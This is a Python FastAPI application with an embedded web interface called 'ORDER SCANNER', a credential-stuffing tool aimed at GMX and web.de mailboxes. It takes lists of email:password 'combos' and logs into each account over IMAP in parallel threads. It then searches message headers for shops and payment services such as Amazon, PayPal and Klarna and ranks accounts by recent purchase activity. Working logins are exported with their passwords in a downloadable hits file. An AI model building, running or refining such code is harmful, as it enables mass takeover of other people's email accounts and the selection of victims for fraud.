from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import imaplib, email, asyncio, json, concurrent.futures, socket
from datetime import datetime, timezone

app = FastAPI()

PROVIDER_MAP = {
    "gmx.de":("imap.gmx.net",993),"gmx.net":("imap.gmx.net",993),
    "gmx.at":("imap.gmx.net",993),"gmx.ch":("imap.gmx.net",993),
    "web.de":("imap.web.de",993),
}

SHOPS = {
    "amazon":"Amazon","lieferando":"Lieferando","zalando":"Zalando","payback":"Payback",
    "airbnb":"Airbnb","booking.com":"Booking","ebay":"eBay","otto":"Otto","rewe":"REWE",
    "lidl":"Lidl","aldi":"Aldi","kaufland":"Kaufland","mediamarkt":"MediaMarkt",
    "saturn":"Saturn","ikea":"IKEA","baur":"Baur","aboutyou":"AboutYou",
    "bestsecret":"Bestsecret","peek":"Peek&Cloppenburg","shopapotheke":"ShopApotheke",
    "flixbus":"FlixBus","bahn":"Bahn","lufthansa":"Lufthansa","eventim":"Eventim",
    "netflix":"Netflix","spotify":"Spotify","paypal":"PayPal","klarna":"Klarna",
    "kleinanzeigen":"Kleinanzeigen","dhl":"DHL","hermes":"Hermes","dpd":"DPD",
    "noreply":"NoReply","no-reply":"NoReply","donotreply":"NoReply",
    "newsletter":"Newsletter","versand":"Versand","order":"Order",
    "zara":"Zara","hm.com":"H&M","deichmann":"Deichmann","tchibo":"Tchibo",
    "dm.de":"DM","rossmann":"Rossmann","douglas":"Douglas","adidas":"Adidas","nike":"Nike",
}

def days_ago(ds):
    try:
        from email.utils import parsedate_to_datetime
        dt=parsedate_to_datetime(ds)
        if dt.tzinfo is None: dt=dt.replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc)-dt).days
    except: return 9999

def classify(d):
    if d<=30: return "HOT","🔥"
    if d<=180: return "WARM","🌤"
    return "COLD","❄"

def check(line):
    line=line.strip()
    if not line or ":" not in line: return None
    idx=line.index(":")
    ea=line[:idx].strip().lower(); pw=line[idx+1:].strip()
    if "@" not in ea or not pw: return None
    domain=ea.split("@")[1]
    if domain not in PROVIDER_MAP: return {"type":"skip","email":ea}
    host,port=PROVIDER_MAP[domain]
    try:
        conn=imaplib.IMAP4_SSL(host,port,timeout=25)
        conn.login(ea,pw)
        sh={}; nd={}
        _,mbs=conn.list()
        folders=[]
        for mb in (mbs or []):
            if not mb: continue
            try:
                s=mb.decode() if isinstance(mb,bytes) else mb
                p=s.split('"'); f=p[-2] if len(p)>=3 else s.split()[-1].strip('"')
                folders.append(f)
            except: continue
        for f in folders:
            try:
                st,_=conn.select(f,readonly=True)
                if st!="OK": continue
                _,ids=conn.search(None,"ALL")
                if not ids[0]: continue
                for mid in ids[0].split()[-150:]:
                    try:
                        _,md=conn.fetch(mid,"(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])")
                        raw=md[0][1]
                        if not isinstance(raw,bytes): continue
                        msg=email.message_from_bytes(raw)
                        c=(msg.get("From","")+msg.get("Subject","")).lower()
                        d=days_ago(msg.get("Date",""))
                        for kw,shop in SHOPS.items():
                            if kw in c:
                                sh[shop]=sh.get(shop,0)+1
                                if shop not in nd or d<nd[shop]: nd[shop]=d
                    except: continue
            except: continue
        try: conn.logout()
        except: pass
        fil={s:(c,nd.get(s,9999)) for s,c in sh.items() if classify(nd.get(s,9999))[0]!="COLD"}
        if fil:
            md2=min(v[1] for v in fil.values()); t,ic=classify(md2)
            shops_out={s:{"count":c,"days":d,"temp":classify(d)[0],"icon":classify(d)[1]} for s,(c,d) in fil.items()}
            return {"type":"hit","email":ea,"passw":pw,"shops":shops_out,"days":md2,"temp":t,"icon":ic}
        return {"type":"miss","email":ea}
    except imaplib.IMAP4.error: return {"type":"bad","email":ea}
    except (socket.timeout,TimeoutError): return {"type":"timeout","email":ea}
    except Exception as e: return {"type":"error","email":ea,"reason":str(e)[:50]}

HTML=r"""<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ORDER SCANNER</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:14px;font-size:13px}
h1{color:#b060ff;text-align:center;font-size:20px;letter-spacing:4px;margin-bottom:2px;text-shadow:0 0 20px #b060ff88}
.sub{text-align:center;color:#444;font-size:11px;margin-bottom:14px}
.legend{display:flex;gap:14px;justify-content:center;margin-bottom:14px;font-size:12px}
textarea{width:100%;height:100px;background:#111;border:1px solid #2a2a2a;color:#ccc;padding:10px;font-family:monospace;font-size:12px;border-radius:8px;resize:vertical;outline:none}
textarea:focus{border-color:#b060ff55}
.hint{font-size:11px;color:#333;margin:4px 0 10px}
.controls{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.thr-label{font-size:11px;color:#444;white-space:nowrap}
input[type=number]{width:55px;background:#111;border:1px solid #2a2a2a;color:#ccc;padding:7px;border-radius:6px;font-size:13px;text-align:center;outline:none}
#btn-start{flex:1;padding:11px;background:#b060ff;color:#fff;border:none;border-radius:8px;font-family:monospace;font-weight:bold;font-size:14px;cursor:pointer;letter-spacing:2px}
#btn-start:active{background:#8040cc}
#btn-stop{padding:11px 14px;background:#1a1a1a;color:#ff4444;border:1px solid #ff444433;border-radius:8px;font-family:monospace;font-weight:bold;cursor:pointer;display:none}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
.stat{background:#111;border:1px solid #1a1a1a;border-radius:8px;padding:8px 4px;text-align:center}
.stat-n{font-size:22px;font-weight:bold;line-height:1.1}
.stat-l{font-size:10px;color:#444;margin-top:2px}
.pg{background:#1a1a1a;border-radius:4px;height:5px;overflow:hidden;margin-bottom:4px}
.pb{height:5px;background:linear-gradient(90deg,#b060ff,#ff60aa);border-radius:4px;width:0%;transition:width .4s}
.pl{font-size:10px;color:#333;text-align:center;margin-bottom:10px}
#log{height:300px;overflow-y:auto;background:#080808;border:1px solid #1a1a1a;border-radius:8px;padding:10px;font-size:12px;line-height:1.8}
#log::-webkit-scrollbar{width:4px}#log::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:2px}
.lh{color:#44ff88}.lm{color:#ff4444}.ls{color:#2a2a2a}.lw{color:#ffaa00}.li{color:#00ccff}
.hits-box{background:#050f05;border:1px solid #1a3a1a;border-radius:8px;padding:12px;margin-top:12px;display:none}
.hits-title{color:#44ff88;font-weight:bold;margin-bottom:8px}
.hits-txt{font-size:11px;max-height:140px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#888}
#btn-dl{width:100%;margin-top:8px;padding:9px;background:#0a1f0a;border:1px solid #1a4a1a;color:#44ff88;border-radius:6px;font-family:monospace;cursor:pointer;font-size:12px;letter-spacing:1px}
</style></head><body>
<h1>▓ ORDER SCANNER ▓</h1>
<div class="sub">GMX & web.de — No-Reply Hunter</div>
<div class="legend"><span style="color:#ff4444">HOT 🔥 &lt;30d</span><span style="color:#ffaa00">WARM 🌤 &lt;180d</span><span style="color:#333">COLD ❄ hidden</span></div>
<textarea id="combos" placeholder="user@gmx.de:passwort123&#10;test@web.de:geheim456&#10;..."></textarea>
<div class="hint" id="hint">0 Combos geladen</div>
<div class="controls">
  <span class="thr-label">Threads</span>
  <input type="number" id="thr" value="5" min="1" max="15">
  <button id="btn-start" onclick="go()">▶ START</button>
  <button id="btn-stop" onclick="stop()">⏹</button>
</div>
<div class="stats">
  <div class="stat"><div class="stat-n" style="color:#44ff88" id="sh">0</div><div class="stat-l">HITS</div></div>
  <div class="stat"><div class="stat-n" style="color:#ff4444" id="sm">0</div><div class="stat-l">BAD</div></div>
  <div class="stat"><div class="stat-n" style="color:#ffaa00" id="ss">0</div><div class="stat-l">SKIP</div></div>
  <div class="stat"><div class="stat-n" style="color:#00ccff" id="st">0</div><div class="stat-l">TOTAL</div></div>
</div>
<div class="pg"><div class="pb" id="pb"></div></div>
<div class="pl" id="pl">0 / 0</div>
<div id="log"><span style="color:#222">Warte auf Start...</span></div>
<div class="hits-box" id="hbox">
  <div class="hits-title">📁 ORDER-HITS — <span id="hcount">0</span></div>
  <div class="hits-txt" id="htxt"></div>
  <button id="btn-dl" onclick="dl()">⬇ hits.txt herunterladen</button>
</div>
<script>
let ws,running=false,hits=[],hc=0,mc=0,sc=0,tot=0,chk=0;
document.getElementById('combos').addEventListener('input',function(){
  const n=this.value.trim().split('\n').filter(l=>l.includes(':')).length;
  document.getElementById('hint').textContent=n+' Combos geladen';
});
function log(msg,cls){
  const el=document.getElementById('log');
  if(el.children.length===1&&el.firstChild.style&&el.firstChild.style.color==='rgb(34,34,34)')el.innerHTML='';
  const d=document.createElement('div');d.className=cls;d.textContent=msg;
  el.appendChild(d);if(el.children.length>600)el.removeChild(el.firstChild);
  el.scrollTop=el.scrollHeight;
}
function upd(){
  document.getElementById('sh').textContent=hc;
  document.getElementById('sm').textContent=mc;
  document.getElementById('ss').textContent=sc;
  document.getElementById('st').textContent=chk;
  const p=tot>0?Math.round(chk/tot*100):0;
  document.getElementById('pb').style.width=p+'%';
  document.getElementById('pl').textContent=chk+' / '+tot+' ('+p+'%)';
}
function go(){
  const lines=document.getElementById('combos').value.trim().split('\n').filter(l=>l.includes(':'));
  if(!lines.length){log('[ERROR] Keine Combos!','lw');return;}
  const thr=parseInt(document.getElementById('thr').value)||5;
  hits=[];hc=0;mc=0;sc=0;tot=lines.length;chk=0;
  document.getElementById('hbox').style.display='none';
  document.getElementById('log').innerHTML='';
  upd();running=true;
  document.getElementById('btn-start').style.display='none';
  document.getElementById('btn-stop').style.display='block';
  const proto=location.protocol==='https:'?'wss':'ws';
  ws=new WebSocket(proto+'://'+location.host+'/ws');
  ws.onopen=()=>{ws.send(JSON.stringify({combos:lines,threads:thr}));log('[START] '+lines.length+' Combos | '+thr+' Threads','li');};
  ws.onmessage=(e)=>{
    const d=JSON.parse(e.data);
    if(d.type==='hit'){hc++;chk++;
      const ss=Object.entries(d.shops).sort((a,b)=>b[1].count-a[1].count).map(([s,v])=>s+'('+v.count+')').join(', ');
      const tc=d.temp==='HOT'?'🔥 HOT ('+d.days+'d)':'🌤 WARM ('+d.days+'d)';
      log('[ORDER-HIT] '+d.email+' → '+ss+' | '+tc,'lh');
      hits.push(d.email+':'+d.passw+' → '+ss+' | '+d.temp+' '+d.icon+' ('+d.days+'d)');
    }else if(d.type==='bad'){mc++;chk++;log('[BAD]     '+d.email,'lm');
    }else if(d.type==='miss'){mc++;chk++;log('[MISS]    '+d.email,'lm');
    }else if(d.type==='skip'){sc++;chk++;log('[SKIP]    '+d.email,'ls');
    }else if(d.type==='timeout'){sc++;chk++;log('[TIMEOUT] '+d.email,'lw');
    }else if(d.type==='error'){sc++;chk++;log('[ERR]     '+d.email+' '+(d.reason||''),'lw');
    }else if(d.type==='done'){
      log('━'.repeat(35),'ls');log('FERTIG — '+hc+' ORDER-HITS / '+chk+' gecheckt','li');
      running=false;done();
    }
    upd();
  };
  ws.onclose=()=>{running=false;done();};
}
function done(){
  document.getElementById('btn-start').style.display='block';
  document.getElementById('btn-stop').style.display='none';
  if(hits.length>0){
    document.getElementById('htxt').textContent='=== ORDER-HITS '+hc+'/'+tot+' ===\n'+hits.join('\n');
    document.getElementById('hcount').textContent=hc+' Hits';
    document.getElementById('hbox').style.display='block';
  }
}
function stop(){if(ws)ws.close();log('[STOP] Gestoppt.','lw');}
function dl(){
  const c='=== ORDER-HITS '+hc+'/'+tot+' ===\nDatum: '+new Date().toLocaleString('de-DE')+'\n'+'─'.repeat(50)+'\n'+hits.join('\n');
  const b=new Blob([c],{type:'text/plain'});const u=URL.createObjectURL(b);
  const a=document.createElement('a');a.href=u;a.download='order_hits.txt';a.click();URL.revokeObjectURL(u);
}
</script></body></html>"""

@app.get("/",response_class=HTMLResponse)
async def index(): return HTML

@app.websocket("/ws")
async def ws_endpoint(websocket:WebSocket):
    await websocket.accept()
    try:
        data=await websocket.receive_text()
        pl=json.loads(data)
        combos=pl.get("combos",[])
        threads=min(int(pl.get("threads",5)),15)
        loop=asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futs={ex.submit(check,c):c for c in combos}
            for fut in concurrent.futures.as_completed(futs):
                r=fut.result()
                if r: await websocket.send_text(json.dumps(r))
        await websocket.send_text(json.dumps({"type":"done"}))
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await websocket.send_text(json.dumps({"type":"error","email":"server","reason":str(e)}))
        except: pass
